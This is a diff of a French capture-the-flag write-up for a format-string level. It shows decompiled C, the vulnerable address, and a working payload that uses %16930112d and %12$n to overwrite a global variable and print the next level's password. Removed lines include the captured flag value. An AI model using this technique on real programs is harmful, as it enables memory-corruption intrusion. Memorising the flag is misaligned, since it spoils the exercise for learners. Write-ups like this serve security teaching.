@@ -1,34 +1,52 @@
-# Level 4
+# Level 4 - Format String Vulnerability
 
-meme chose que level 3 sauf que le debut de la format string a la 2 eme position sur la stack et m est comparer a un tres grand nombre:
+## Analyse du binaire
+En décompilant le binaire, on trouve le code suivant :
 
-
-#### code decompiler
 ```c
 void n(void)
-
 {
   char local_20c [520];
   
   fgets(local_20c,0x200,stdin);
   p(local_20c);
-  if (m == 0x1025544) // si m = 16930116
-	{
+  if (m == 0x1025544) // 16930116 en décimal
+  {
     system("/bin/cat /home/user/level5/.pass");
   }
   return;
 }
-
 ```
 
-(python -c 'print("\x10\x98\x04\x08" + "A" * 16930112" + "%12$n")'; cat -) | ./level4
+Le programme :
+1. Lit l'entrée utilisateur avec fgets
+2. Passe cette entrée à la fonction p()
+3. Compare la variable globale 'm' avec 0x1025544
+4. Si égal, affiche le flag
 
-ca n marche pas le terminal ne supporte pas autant de caractere donc on peut utiliser le formatage de largeur minimale du format string printf avec `%16930112d` ce format va imprimer 16930112 d'espace pour afficher le parametre
+## Vulnérabilité
+- Le programme est vulnérable à une attaque format string via la fonction p()
+- Nous pouvons utiliser cette vulnérabilité pour écrire à l'adresse de 'm'
+- L'adresse de 'm' est : 0x8049810
 
+## Exploitation
+Pour obtenir le flag, nous devons :
+1. Écrire l'adresse de 'm' au début de notre payload
+2. Utiliser %n pour écrire la valeur 16930116 à cette adresse
+
+La commande :
 ```bash
 (python -c 'print("\x10\x98\x04\x08" + "%16930112d" + "%12$n")'; cat -) | ./level4
-                                                                                        ...                                                                                -1208015184
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
-on a un nombre random et le flag qui s'affiche
+
+Décomposition :
+- `\x10\x98\x04\x08` : Adresse de 'm' en little-endian
+- `%16930112d` : Format qui va générer 16930112 espaces
+- `%12$n` : Écrit le nombre de caractères affichés à la 12ème position de la stack
+- `cat -` : Garde stdin ouvert
+
+## Résultat
+L'exploit modifie avec succès la valeur de 'm' à 0x1025544, ce qui déclenche l'affichage du flag.
+
+Note : On utilise %16930112d au lieu de répéter 'A' 16930112 fois car le terminal ne peut pas gérer autant de caractères directement.
 
